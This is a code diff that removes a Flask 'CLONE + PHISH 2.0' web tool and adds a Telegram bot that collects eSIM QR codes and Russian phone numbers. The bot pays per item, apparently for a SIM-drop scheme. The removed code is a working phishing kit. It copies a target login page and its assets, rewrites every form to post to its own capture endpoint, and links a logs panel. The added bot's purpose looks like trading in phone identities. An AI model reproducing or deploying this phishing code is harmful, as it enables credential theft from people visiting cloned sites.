@@ -1,416 +1,1102 @@
-import subprocess, sys, os, time, json, re, hashlib, shutil, zipfile, threading, requests
-from urllib.parse import urljoin, urlparse
-from flask import Flask, request, send_file, jsonify
-from bs4 import BeautifulSoup
+import asyncio
+import logging
+import re
+import io
+import os
+import sqlite3
+from datetime import datetime, timedelta
+from typing import Optional
 
-app = Flask(__name__)
-PROJECTS = {}
+from aiogram import Bot, Dispatcher, types, F
+from aiogram.fsm.context import FSMContext
+from aiogram.fsm.state import State, StatesGroup
+from aiogram.fsm.storage.memory import MemoryStorage
+from aiogram.types import (
+    InlineKeyboardMarkup, InlineKeyboardButton,
+    Message, CallbackQuery, FSInputFile, BufferedInputFile
+)
+from aiogram.client.default import DefaultBotProperties
+from aiogram.enums import ParseMode, ChatType
+from aiogram.filters import Command
+from dotenv import load_dotenv
+import qrcode
+from PIL import Image
 
-# Проверка и автоустановка Playwright
-def ensure_playwright():
-    try:
-        from playwright.sync_api import sync_playwright
-        return True
-    except ImportError:
-        print("Устанавливаю playwright...")
-        subprocess.check_call([sys.executable, "-m", "pip", "install", "playwright"])
-        subprocess.check_call(["playwright", "install", "chromium"])
-        return True
+# ============ .ENV ЗАГРУЗКА ============
+load_dotenv()
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+ADMIN_IDS = list(map(int, os.getenv("ADMIN_IDS", "").split(",")))
 
-ensure_playwright()
+if not BOT_TOKEN:
+    raise ValueError("BOT_TOKEN не найден в .env")
 
-@app.route('/')
-def home():
-    return r'''<!DOCTYPE html>
-<html lang="ru">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Site Cloner</title>
-<style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{background:#0a0a0f;color:#e0e0e0;font-family:Arial;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
-.box{max-width:500px;width:100%}
-h1{text-align:center;font-size:28px;margin-bottom:20px;color:#667eea}
-.card{background:#111122;border-radius:16px;padding:25px;border:1px solid #222;margin-bottom:15px}
-label{display:block;margin-bottom:8px;color:#aaa;font-size:14px}
-input{width:100%;padding:14px;border:1px solid #333;border-radius:12px;background:#0a0a14;color:#fff;font-size:16px;margin-bottom:15px}
-input:focus{outline:none;border-color:#667eea}
-button{width:100%;padding:15px;border:none;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;color:#fff}
-button:hover{opacity:0.85}
-.btn-clone{background:#667eea;margin-bottom:10px}
-.btn-phish{background:#f5576c}
-.result{margin-top:20px;padding:20px;border-radius:12px;display:none;word-break:break-all}
-.result.show{display:block}
-.result.success{background:#0a2a0a;border:1px solid #0f0}
-.result.error{background:#2a0a0a;border:1px solid #f00}
-.result a{color:#667eea;display:block;margin:5px 0}
-.loading{display:none;text-align:center;padding:15px;color:#888}
-.spinner{width:30px;height:30px;border:3px solid #333;border-top-color:#667eea;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto 10px}
-@keyframes spin{to{transform:rotate(360deg)}}
-</style>
-</head>
-<body>
-<div class="box">
-<h1>CLONE + PHISH 2.0</h1>
-<div class="card">
-<label>Ссылка на сайт</label>
-<input type="text" id="url" placeholder="https://example.com/login">
-<button class="btn-clone" onclick="doClone()">СКОПИРОВАТЬ САЙТ</button>
-<button class="btn-phish" onclick="doPhish()">ФИШИНГ (точная копия)</button>
-</div>
-<div class="loading" id="load"><div class="spinner"></div>Работаю...</div>
-<div class="result" id="res"></div>
-</div>
-<script>
-async function doClone(){await run('/api/clone')}
-async function doPhish(){await run('/api/phish')}
-async function run(url){
-var u=document.getElementById('url').value.trim();
-if(!u)return;
-document.getElementById('load').style.display='block';
-document.getElementById('res').classList.remove('show');
-try{
-var r=await fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:u})});
-var d=await r.json();
-if(d.error){document.getElementById('res').innerHTML='<b>Ошибка:</b> '+d.error;document.getElementById('res').classList.add('show','error')}
-else{
-document.getElementById('res').innerHTML='<b>ГОТОВО!</b><br><br><b>Клон:</b> <a href="'+d.url+'" target="_blank">'+d.url+'</a><br><b>Скачать:</b> <a href="'+d.download+'">ZIP</a><br><b>Логи:</b> <a href="'+d.panel+'" target="_blank">Панель</a><br><small>Файлов: '+d.assets+' | Форм: '+d.forms+'</small>';
-document.getElementById('res').classList.add('show','success')
-}
-}catch(e){document.getElementById('res').innerHTML='<b>Ошибка:</b> '+e.message;document.getElementById('res').classList.add('show','error')}
-document.getElementById('load').style.display='none'
-}
-</script>
-</body>
-</html>'''
+# ============ ЛОГГЕР ============
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
 
-# Функция рендеринга через Playwright
-def render_page(url):
-    from playwright.sync_api import sync_playwright
-    with sync_playwright() as p:
-        browser = p.chromium.launch(headless=True)
-        context = browser.new_context(
-            viewport={"width": 390, "height": 844},
-            user_agent="Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"
+# ============ БОТ И ДИСПЕТЧЕР ============
+bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
+dp = Dispatcher(storage=MemoryStorage())
+
+# ============ БАЗА ДАННЫХ ============
+DB_PATH = "esim_bot.db"
+BACKUP_DIR = "backups"
+
+if not os.path.exists(BACKUP_DIR):
+    os.makedirs(BACKUP_DIR)
+
+def get_db():
+    conn = sqlite3.connect(DB_PATH)
+    conn.row_factory = sqlite3.Row
+    return conn
+
+def init_db():
+    conn = get_db()
+    c = conn.cursor()
+
+    # Пользователи (исполнители)
+    c.execute('''
+        CREATE TABLE IF NOT EXISTS users (
+            user_id INTEGER PRIMARY KEY,
+            username TEXT,
+            first_name TEXT,
+            rank TEXT DEFAULT 'Старт',
+            bonus REAL DEFAULT 0.0,
+            priority REAL DEFAULT 0.5,
+            qr_month INTEGER DEFAULT 0,
+            total_qr INTEGER DEFAULT 0,
+            balance REAL DEFAULT 0.0,
+            joined TEXT DEFAULT CURRENT_TIMESTAMP
         )
-        page = context.new_page()
-        page.goto(url, wait_until="networkidle", timeout=30000)
-        page.wait_for_timeout(3000)  # Дополнительное ожидание
-        html = page.content()
-        screenshot = page.screenshot(full_page=True)
-        browser.close()
-        return html, screenshot
+    ''')
 
-# Загрузка ресурсов (статических)
-def download_assets(sess, soup, base_url, out_dir):
-    assets = 0
-    # CSS
-    for tag in soup.find_all('link', href=True):
-        href = urljoin(base_url, tag['href'].strip())
-        try:
-            name = os.path.basename(urlparse(href).path.split('?')[0])
-            if not name or '.' not in name: name = 'style.css'
-            r = sess.get(href, timeout=10)
-            if r.status_code == 200 and len(r.content) > 100:
-                with open(out_dir + '/assets/' + name, 'wb') as f: f.write(r.content)
-                tag['href'] = 'assets/' + name
-                assets += 1
-        except: pass
-    # JS
-    for tag in soup.find_all('script', src=True):
-        src = urljoin(base_url, tag['src'].strip())
-        try:
-            name = os.path.basename(urlparse(src).path.split('?')[0])
-            if not name or '.' not in name: name = 'script.js'
-            r = sess.get(src, timeout=10)
-            if r.status_code == 200 and len(r.content) > 100:
-                with open(out_dir + '/assets/' + name, 'wb') as f: f.write(r.content)
-                tag['src'] = 'assets/' + name
-                assets += 1
-        except: pass
-    # IMG
-    for tag in soup.find_all('img', src=True):
-        src = tag['src'].strip()
-        if not src or src.startswith('data:'): continue
-        src = urljoin(base_url, src)
-        try:
-            ext = os.path.splitext(urlparse(src).path.split('?')[0])[1] or '.png'
-            name = 'img_' + str(abs(hash(src)))[:8] + ext
-            r = sess.get(src, timeout=10)
-            if r.status_code == 200 and len(r.content) > 100:
-                with open(out_dir + '/assets/' + name, 'wb') as f: f.write(r.content)
-                tag['src'] = 'assets/' + name
-                assets += 1
-        except: pass
-    return assets
+    # Заявки
+    c.execute('''
+        CREATE TABLE IF NOT EXISTS orders (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            operator TEXT,
+            price REAL,
+            mode TEXT DEFAULT 'БХ',
+            status TEXT DEFAULT 'active',
+            executor_id INTEGER,
+            phone TEXT,
+            qr_file_id TEXT,
+            channel_msg_id INTEGER,
+            created TEXT DEFAULT CURRENT_TIMESTAMP,
+            taken TEXT,
+            done TEXT
+        )
+    ''')
 
-# API Clone (обычный)
-@app.route('/api/clone', methods=['POST'])
-def api_clone():
-    url = (request.get_json(silent=True) or {}).get('url', '').strip()
-    if not url: return jsonify({'error': 'Введите URL'}), 400
-    if not url.startswith('http'): url = 'https://' + url
+    # Операторы и цены
+    c.execute('''
+        CREATE TABLE IF NOT EXISTS operators (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            name TEXT UNIQUE,
+            price REAL,
+            emoji TEXT DEFAULT '📱',
+            active INTEGER DEFAULT 1
+        )
+    ''')
 
-    pid = 'c' + hashlib.md5((url + str(time.time())).encode()).hexdigest()[:10]
-    out = '/tmp/' + pid
-    os.makedirs(out + '/assets', exist_ok=True)
+    # Каналы
+    c.execute('''
+        CREATE TABLE IF NOT EXISTS channels (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            channel_id TEXT UNIQUE,
+            username TEXT
+        )
+    ''')
 
-    sess = requests.Session()
-    sess.headers.update({
-        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)',
-        'Accept-Language': 'ru-RU,ru;q=0.9'
-    })
+    # Группы
+    c.execute('''
+        CREATE TABLE IF NOT EXISTS groups (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            group_id TEXT UNIQUE,
+            username TEXT,
+            active INTEGER DEFAULT 0
+        )
+    ''')
+
+    # Настройки кнопок
+    c.execute('''
+        CREATE TABLE IF NOT EXISTS button_config (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            button_name TEXT UNIQUE,
+            text TEXT,
+            emoji TEXT DEFAULT '',
+            row INTEGER DEFAULT 0,
+            position INTEGER DEFAULT 0
+        )
+    ''')
+
+    # Настройки текстов
+    c.execute('''
+        CREATE TABLE IF NOT EXISTS text_config (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            text_key TEXT UNIQUE,
+            content TEXT
+        )
+    ''')
+
+    # Автобэкап
+    c.execute('''
+        CREATE TABLE IF NOT EXISTS settings (
+            key TEXT PRIMARY KEY,
+            value TEXT
+        )
+    ''')
+
+    # Дефолтные операторы
+    defaults = [
+        ('Билайн', 12, '⚙️'),
+        ('МТС', 14, '🔴'),
+        ('Мегафон', 10, '🟢'),
+        ('Т2', 10, '⚪'),
+        ('Сбер', 10, '🟡'),
+        ('Газпром', 20, '🔵'),
+        ('Добросвязь', 14, '🟣'),
+    ]
+    for name, price, emoji in defaults:
+        c.execute('INSERT OR IGNORE INTO operators (name, price, emoji) VALUES (?, ?, ?)', (name, price, emoji))
+
+    # Дефолтные настройки
+    c.execute('INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)', ('auto_backup', 'off'))
+    c.execute('INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)', ('default_mode', 'БХ'))
+
+    conn.commit()
+    conn.close()
+
+init_db()
+
+# ============ FSM СОСТОЯНИЯ ============
+class EsimUpload(StatesGroup):
+    waiting_for_qr = State()
+    waiting_for_phone = State()
+
+class AdminStates(StatesGroup):
+    waiting_for_channel = State()
+    waiting_for_group = State()
+    waiting_for_operator_name = State()
+    waiting_for_operator_price = State()
+    waiting_for_operator_emoji = State()
+    waiting_for_button_name = State()
+    waiting_for_button_text = State()
+    waiting_for_button_emoji = State()
+    waiting_for_db_file = State()
+    waiting_for_broadcast = State()
+    waiting_for_text_key = State()
+    waiting_for_text_content = State()
+
+class CreateOrder(StatesGroup):
+    waiting_for_operator = State()
+
+# ============ ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ============
+def is_admin(user_id: int) -> bool:
+    return user_id in ADMIN_IDS
+
+def format_phone(phone: str) -> Optional[str]:
+    """Приводит номер к формату +7XXXXXXXXXX"""
+    digits = re.sub(r'\D', '', phone)
+    if len(digits) == 11 and digits[0] in ['7', '8']:
+        return f"+7{digits[1:]}"
+    elif len(digits) == 10 and digits[0] == '9':
+        return f"+7{digits}"
+    return None
+
+def get_text(key: str) -> str:
+    conn = get_db()
+    c = conn.cursor()
+    c.execute('SELECT content FROM text_config WHERE text_key = ?', (key,))
+    row = c.fetchone()
+    conn.close()
+    return row['content'] if row else key
+
+def get_user(user_id: int):
+    conn = get_db()
+    c = conn.cursor()
+    c.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
+    row = c.fetchone()
+    conn.close()
+    return row
+
+def ensure_user(user_id: int, username: str = None, first_name: str = None):
+    conn = get_db()
+    c = conn.cursor()
+    c.execute('SELECT user_id FROM users WHERE user_id = ?', (user_id,))
+    if not c.fetchone():
+        c.execute('INSERT INTO users (user_id, username, first_name) VALUES (?, ?, ?)',
+                  (user_id, username, first_name))
+        conn.commit()
+    elif username:
+        c.execute('UPDATE users SET username = ?, first_name = ? WHERE user_id = ?',
+                  (username, first_name, user_id))
+        conn.commit()
+    conn.close()
+
+def get_active_channels():
+    conn = get_db()
+    c = conn.cursor()
+    c.execute('SELECT * FROM channels')
+    rows = c.fetchall()
+    conn.close()
+    return rows
+
+def get_active_groups():
+    conn = get_db()
+    c = conn.cursor()
+    c.execute('SELECT * FROM groups WHERE active = 1')
+    rows = c.fetchall()
+    conn.close()
+    return rows
+
+def get_operators():
+    conn = get_db()
+    c = conn.cursor()
+    c.execute('SELECT * FROM operators WHERE active = 1 ORDER BY id')
+    rows = c.fetchall()
+    conn.close()
+    return rows
+
+def generate_qr_bytes(lpa_string: str) -> io.BytesIO:
+    """Генерирует QR из LPA строки"""
+    qr = qrcode.QRCode(version=1, error_correction=qrcode.constants.ERROR_CORRECT_H,
+                       box_size=10, border=4)
+    qr.add_data(lpa_string)
+    qr.make(fit=True)
+    img = qr.make_image(fill_color="black", back_color="white")
+    bio = io.BytesIO()
+    img.save(bio, 'PNG')
+    bio.seek(0)
+    return bio
+
+# ============ КЛАВИАТУРЫ ============
+def main_menu():
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="👤 Профиль", callback_data="profile")],
+        [InlineKeyboardButton(text="📱 Сдать ESIM", callback_data="sdat_esim")],
+        [InlineKeyboardButton(text="📋 Мои номера", callback_data="my_numbers")],
+        [InlineKeyboardButton(text="📊 Операторы и цены", callback_data="operators_list")],
+        [InlineKeyboardButton(text="👥 Рефералы", callback_data="referral")],
+        [InlineKeyboardButton(text="ℹ️ Помощь", callback_data="help")],
+    ])
+    return kb
+
+def admin_menu():
+    auto = get_setting('auto_backup')
+    auto_text = f"💾 БД: Автовыгрузка [{auto.upper()}]"
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="📝 Кнопки", callback_data="admin_buttons")],
+        [InlineKeyboardButton(text="📋 Тексты", callback_data="admin_texts")],
+        [InlineKeyboardButton(text="💰 Операторы и цены", callback_data="admin_operators")],
+        [InlineKeyboardButton(text="📢 Каналы", callback_data="admin_channels")],
+        [InlineKeyboardButton(text="👥 Группы", callback_data="admin_groups")],
+        [InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats")],
+        [InlineKeyboardButton(text="👤 Участники", callback_data="admin_users")],
+        [InlineKeyboardButton(text="📢 Рассылка", callback_data="admin_broadcast")],
+        [InlineKeyboardButton(text="📱 Создать заявку", callback_data="admin_create_order")],
+        [InlineKeyboardButton(text="💾 БД: Выгрузка", callback_data="admin_db_export")],
+        [InlineKeyboardButton(text="💾 БД: Загрузка", callback_data="admin_db_import")],
+        [InlineKeyboardButton(text=auto_text, callback_data="admin_db_auto")],
+        [InlineKeyboardButton(text="🔙 Закрыть", callback_data="close")],
+    ])
+    return kb
+
+def operators_keyboard():
+    kb = InlineKeyboardMarkup(inline_keyboard=[])
+    ops = get_operators()
+    for op in ops:
+        kb.inline_keyboard.append([
+            InlineKeyboardButton(
+                text=f"{op['emoji']} {op['name']} · {op['price']}$",
+                callback_data=f"order_op_{op['id']}"
+            )
+        ])
+    kb.inline_keyboard.append([InlineKeyboardButton(text="🔙 Назад", callback_data="back_main")])
+    return kb
+
+def back_to_admin():
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🔙 Назад", callback_data="admin_back")]
+    ])
+
+def get_setting(key: str) -> str:
+    conn = get_db()
+    c = conn.cursor()
+    c.execute('SELECT value FROM settings WHERE key = ?', (key,))
+    row = c.fetchone()
+    conn.close()
+    return row['value'] if row else ''
+
+def set_setting(key: str, value: str):
+    conn = get_db()
+    c = conn.cursor()
+    c.execute('INSERT INTO settings (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value = ?',
+              (key, value, value))
+    conn.commit()
+    conn.close()
+
+# ============ /start ============
+@dp.message(Command("start"))
+async def cmd_start(message: Message):
+    ensure_user(message.from_user.id, message.from_user.username, message.from_user.first_name)
+    await message.answer(
+        "<b>🚀 ERWINS ESIM BOT</b>\n\nВыберите действие:",
+        reply_markup=main_menu()
+    )
+
+# ============ /emjid ============
+@dp.message(Command("emjid"))
+async def cmd_emjid(message: Message):
+    text = message.text.replace('/emjid', '').strip()
+    if not text:
+        await message.answer("Отправьте эмодзи после команды: <code>/emjid 🚀</code>")
+        return
+    emoji = text[0] if text else ''
+    code = hex(ord(emoji)) if emoji else ''
+    await message.answer(
+        f"<b>Эмодзи:</b> {emoji}\n"
+        f"<b>Unicode:</b> <code>U+{code[2:].upper()}</code>\n"
+        f"<b>HTML:</b> <code>&amp;#x{code[2:]};</code>\n"
+        f"<b>Для кнопок:</b> можно вставить в админ-панели"
+    )
+
+# ============ /admin ============
+@dp.message(Command("admin"))
+async def cmd_admin(message: Message):
+    if not is_admin(message.from_user.id):
+        await message.answer("⛔ Доступ запрещён")
+        return
+    await message.answer("<b>🛠️ АДМИН-ПАНЕЛЬ</b>", reply_markup=admin_menu())
+
+# ============ /work (для групп) ============
+@dp.message(Command("work"))
+async def cmd_work(message: Message):
+    if message.chat.type not in [ChatType.GROUP, ChatType.SUPERGROUP]:
+        await message.answer("Эта команда только для групп")
+        return
+
+    conn = get_db()
+    c = conn.cursor()
+    c.execute('SELECT * FROM groups WHERE group_id = ?', (str(message.chat.id),))
+    row = c.fetchone()
+
+    if not row:
+        await message.answer("⚠️ Бот не настроен для этой группы. Админ должен добавить группу через /admin.")
+        conn.close()
+        return
+
+    new_status = 0 if row['active'] == 1 else 1
+    c.execute('UPDATE groups SET active = ? WHERE group_id = ?', (new_status, str(message.chat.id)))
+    conn.commit()
+    conn.close()
+
+    if new_status:
+        await message.answer("✅ <b>Бот активирован в группе!</b>\nИспользуйте /esim для запроса номеров.")
+    else:
+        await message.answer("⏸️ <b>Бот отключён в группе.</b>")
+
+# ============ /esim (в группе) ============
+@dp.message(Command("esim"))
+async def cmd_esim(message: Message):
+    if message.chat.type not in [ChatType.GROUP, ChatType.SUPERGROUP]:
+        await message.answer("Эта команда только для групп")
+        return
+
+    conn = get_db()
+    c = conn.cursor()
+    c.execute('SELECT * FROM groups WHERE group_id = ? AND active = 1', (str(message.chat.id),))
+    if not c.fetchone():
+        conn.close()
+        await message.answer("⏸️ Бот не активен в группе. /work для включения.")
+        return
+    conn.close()
+
+    ops = get_operators()
+    if not ops:
+        await message.answer("Нет доступных операторов.")
+        return
+
+    kb = InlineKeyboardMarkup(inline_keyboard=[])
+    for op in ops:
+        kb.inline_keyboard.append([
+            InlineKeyboardButton(
+                text=f"{op['emoji']} {op['name']} · {op['price']}$",
+                callback_data=f"group_req_{op['id']}"
+            )
+        ])
+
+    await message.answer("<b>📱 ВЫБЕРИТЕ ОПЕРАТОРА</b>", reply_markup=kb)
+
+# ============ ЗАПРОС ИЗ ГРУППЫ ============
+@dp.callback_query(F.data.startswith("group_req_"))
+async def group_request(callback: CallbackQuery):
+    op_id = int(callback.data.split("_")[2])
+    conn = get_db()
+    c = conn.cursor()
+    c.execute('SELECT * FROM operators WHERE id = ?', (op_id,))
+    op = c.fetchone()
+    conn.close()
+
+    if not op:
+        await callback.answer("Оператор не найден")
+        return
+
+    channels = get_active_channels()
+    if not channels:
+        await callback.answer("Нет настроенных каналов для заявок")
+        return
+
+    # Создаём заявку
+    conn = get_db()
+    c = conn.cursor()
+    c.execute('INSERT INTO orders (operator, price, mode, status) VALUES (?, ?, ?, ?)',
+              (op['name'], op['price'], get_setting('default_mode'), 'active'))
+    order_id = c.lastrowid
+    conn.commit()
+    conn.close()
+
+    # Публикуем в канал
+    channel_id = channels[0]['channel_id']
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🔥 ЗАБРАТЬ ЗАКАЗ", callback_data=f"take_order_{order_id}")]
+    ])
+
+    msg_text = (
+        f"<b>🔔 НОВЫЙ ЗАКАЗ #{order_id}</b>\n\n"
+        f"📱 <b>Оператор:</b> {op['emoji']} {op['name']}\n"
+        f"💰 <b>Цена:</b> {op['price']}$\n"
+        f"🎯 <b>Режим:</b> {get_setting('default_mode')}\n"
+        f"⏳ <b>Дедлайн:</b> 10 минут\n\n"
+        f"<i>Кто первый нажмёт — тому заказ</i>"
+    )
+
     try:
-        r = sess.get(url, allow_redirects=True, timeout=20)
-        if r.status_code != 200: return jsonify({'error': 'HTTP ' + str(r.status_code)}), 400
-        soup = BeautifulSoup(r.text, 'html.parser')
-        final_url = r.url
-        domain = urlparse(final_url).netloc
-        assets = download_assets(sess, soup, final_url, out)
-        forms = 0
-        for form in soup.find_all('form'):
-            form['action'] = '/submit/' + pid
-            form['method'] = 'POST'
-            forms += 1
-
-        html = '<!DOCTYPE html>\n<html>\n<head>\n<meta charset="UTF-8">\n'
-        html += '<meta name="viewport" content="width=device-width, initial-scale=1.0">\n'
-        html += '<base href="/p/' + pid + '/">\n'
-        head = soup.find('head')
-        if head:
-            for tag in head.find_all(True):
-                if tag.name in ['meta', 'title', 'link', 'style', 'script']:
-                    html += str(tag) + '\n'
-        html += '</head>\n' + (str(soup.find('body')) if soup.find('body') else str(soup)) + '\n</html>'
-
-        with open(out + '/index.html', 'w', encoding='utf-8') as f: f.write(html)
-        PROJECTS[pid] = {'url': url, 'domain': domain, 'dir': out, 'assets': assets, 'forms': forms, 'logs': [], 'type': 'clone'}
-        host = request.host_url.rstrip('/')
-        return jsonify({
-            'id': pid, 'url': host + '/p/' + pid, 'download': host + '/api/download/' + pid,
-            'panel': host + '/panel/' + pid, 'assets': assets, 'forms': forms
-        })
+        sent = await bot.send_message(chat_id=channel_id, text=msg_text, reply_markup=kb)
+        c = get_db().cursor()
+        conn = get_db()
+        c.execute('UPDATE orders SET channel_msg_id = ? WHERE id = ?', (sent.message_id, order_id))
+        conn.commit()
+        conn.close()
+        await callback.answer("✅ Заявка создана и отправлена в канал!")
+        await callback.message.edit_text(
+            callback.message.text + f"\n\n✅ Заявка #{order_id} отправлена в канал."
+        )
     except Exception as e:
-        return jsonify({'error': str(e)[:200]}), 500
+        await callback.answer(f"Ошибка: {e}")
 
-# API Phish с Playwright
-@app.route('/api/phish', methods=['POST'])
-def api_phish():
-    url = (request.get_json(silent=True) or {}).get('url', '').strip()
-    if not url: return jsonify({'error': 'Введите URL'}), 400
-    if not url.startswith('http'): url = 'https://' + url
+# ============ ЗАБРАТЬ ЗАКАЗ ============
+@dp.callback_query(F.data.startswith("take_order_"))
+async def take_order(callback: CallbackQuery):
+    order_id = int(callback.data.split("_")[2])
+    conn = get_db()
+    c = conn.cursor()
+    c.execute('SELECT * FROM orders WHERE id = ?', (order_id,))
+    order = c.fetchone()
 
-    pid = 'p' + hashlib.md5((url + str(time.time())).encode()).hexdigest()[:10]
-    out = '/tmp/' + pid
-    os.makedirs(out + '/assets', exist_ok=True)
+    if not order:
+        await callback.answer("Заказ не найден")
+        conn.close()
+        return
+
+    if order['status'] != 'active':
+        await callback.answer("❌ Заказ уже занят!")
+        conn.close()
+        return
+
+    # Занять заказ
+    c.execute('UPDATE orders SET status = ?, executor_id = ?, taken = ? WHERE id = ?',
+              ('taken', callback.from_user.id, datetime.now().isoformat(), order_id))
+    conn.commit()
+
+    # Обновить сообщение в канале
+    try:
+        new_text = (
+            f"<b>🔒 ЗАКАЗ #{order_id} ЗАНЯТ</b>\n\n"
+            f"📱 <b>Оператор:</b> {order['operator']}\n"
+            f"💰 <b>Цена:</b> {order['price']}$\n"
+            f"👤 <b>Исполнитель:</b> @{callback.from_user.username or callback.from_user.id}\n"
+            f"⏳ <b>Ожидание сдачи...</b>"
+        )
+        await callback.message.edit_text(new_text, reply_markup=None)
+    except:
+        pass
+
+    conn.close()
+
+    # Уведомить исполнителя
+    await callback.answer("✅ Заказ ваш! Сдайте ESIM в ЛС бота.")
+    await bot.send_message(
+        callback.from_user.id,
+        f"<b>✅ ЗАКАЗ #{order_id} ПРИНЯТ!</b>\n\n"
+        f"📱 {order['operator']} · {order['price']}$\n\n"
+        f"<b>Отправьте фото QR-кода и укажите номер.</b>",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="📱 Сдать ESIM", callback_data=f"sdat_for_{order_id}")]
+        ])
+    )
+
+# ============ СДАТЬ ESIM (ЛИЧКА) ============
+@dp.callback_query(F.data == "sdat_esim")
+async def sdat_esim_start(callback: CallbackQuery, state: FSMContext):
+    await callback.message.answer("<b>📱 СДАЧА ESIM</b>\n\nОтправьте фото QR-кода.")
+    await state.set_state(EsimUpload.waiting_for_qr)
+    await state.update_data(order_id=None)
+    await callback.answer()
+
+@dp.callback_query(F.data.startswith("sdat_for_"))
+async def sdat_for_order(callback: CallbackQuery, state: FSMContext):
+    order_id = int(callback.data.split("_")[2])
+    await callback.message.answer("<b>📱 СДАЧА ESIM</b>\n\nОтправьте фото QR-кода.")
+    await state.set_state(EsimUpload.waiting_for_qr)
+    await state.update_data(order_id=order_id)
+    await callback.answer()
+
+@dp.message(EsimUpload.waiting_for_qr, F.photo)
+async def esim_qr_received(message: Message, state: FSMContext):
+    data = await state.get_data()
+    order_id = data.get('order_id')
+    file_id = message.photo[-1].file_id
+    caption = message.caption
+
+    if caption:
+        phone = format_phone(caption)
+        if phone:
+            await save_esim(message, state, file_id, phone, order_id)
+            return
+
+    await state.update_data(qr_file_id=file_id)
+    await state.set_state(EsimUpload.waiting_for_phone)
+    await message.answer("📱 Укажите номер телефона в российском формате (+7XXXXXXXXXX или 8XXXXXXXXXX)")
+
+@dp.message(EsimUpload.waiting_for_phone)
+async def esim_phone_received(message: Message, state: FSMContext):
+    phone = format_phone(message.text)
+    if not phone:
+        await message.answer("❌ Неверный формат. Укажите: +7XXXXXXXXXX или 8XXXXXXXXXX")
+        return
+
+    data = await state.get_data()
+    file_id = data.get('qr_file_id')
+    order_id = data.get('order_id')
+    await save_esim(message, state, file_id, phone, order_id)
+
+async def save_esim(message: Message, state: FSMContext, file_id: str, phone: str, order_id: int = None):
+    user_id = message.from_user.id
+    ensure_user(user_id, message.from_user.username, message.from_user.first_name)
+
+    conn = get_db()
+    c = conn.cursor()
+
+    if order_id:
+        c.execute('UPDATE orders SET status = ?, phone = ?, qr_file_id = ?, done = ? WHERE id = ?',
+                  ('done', phone, file_id, datetime.now().isoformat(), order_id))
+        # Обновить счётчик
+        c.execute('UPDATE users SET qr_month = qr_month + 1, total_qr = total_qr + 1 WHERE user_id = ?',
+                  (user_id,))
+
+    conn.commit()
+    c.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
+    user = c.fetchone()
+    conn.close()
+
+    bonus = user['bonus'] if user else 0
+    qr_month = user['qr_month'] if user else 0
+
+    await message.answer(
+        f"<b>✅ ESIM СДАН!</b>\n\n"
+        f"📱 <b>Номер:</b> <code>{phone}</code>\n"
+        f"📊 <b>Зачтено QR за месяц:</b> {qr_month}\n"
+        f"💵 <b>Бонус:</b> +{bonus}$ к каждому QR\n"
+        f"🏆 <b>Ранг:</b> {user['rank'] if user else 'Старт'}"
+    )
+
+    await state.clear()
+
+# ============ АДМИН: КАНАЛЫ ============
+@dp.callback_query(F.data == "admin_channels")
+async def admin_channels(callback: CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer("Доступ запрещён")
+        return
+
+    channels = get_active_channels()
+    text = "<b>📢 НАСТРОЙКА КАНАЛОВ</b>\n\n"
+    if channels:
+        for ch in channels:
+            text += f"• {ch['username'] or ch['channel_id']}\n"
+    else:
+        text += "<i>Нет каналов</i>"
+
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="➕ Добавить канал", callback_data="admin_add_channel")],
+        [InlineKeyboardButton(text="🗑️ Удалить канал", callback_data="admin_del_channel")],
+        [InlineKeyboardButton(text="🔙 Назад", callback_data="admin_back")],
+    ])
+
+    await callback.message.edit_text(text, reply_markup=kb)
+    await callback.answer()
+
+@dp.callback_query(F.data == "admin_add_channel")
+async def admin_add_channel(callback: CallbackQuery, state: FSMContext):
+    if not is_admin(callback.from_user.id): return
+    await callback.message.edit_text(
+        "Перешлите любое сообщение из канала или введите @username канала.",
+        reply_markup=back_to_admin()
+    )
+    await state.set_state(AdminStates.waiting_for_channel)
+    await callback.answer()
+
+@dp.message(AdminStates.waiting_for_channel)
+async def channel_received(message: Message, state: FSMContext):
+    if not is_admin(message.from_user.id): return
+
+    channel_id = None
+    username = None
+
+    if message.forward_from_chat:
+        channel_id = str(message.forward_from_chat.id)
+        username = message.forward_from_chat.username
+    elif message.text and message.text.startswith('@'):
+        username = message.text.strip()
+        try:
+            chat = await bot.get_chat(username)
+            channel_id = str(chat.id)
+        except:
+            await message.answer("Не удалось найти канал")
+            return
+    else:
+        await message.answer("Перешлите сообщение из канала или введите @username")
+        return
+
+    conn = get_db()
+    c = conn.cursor()
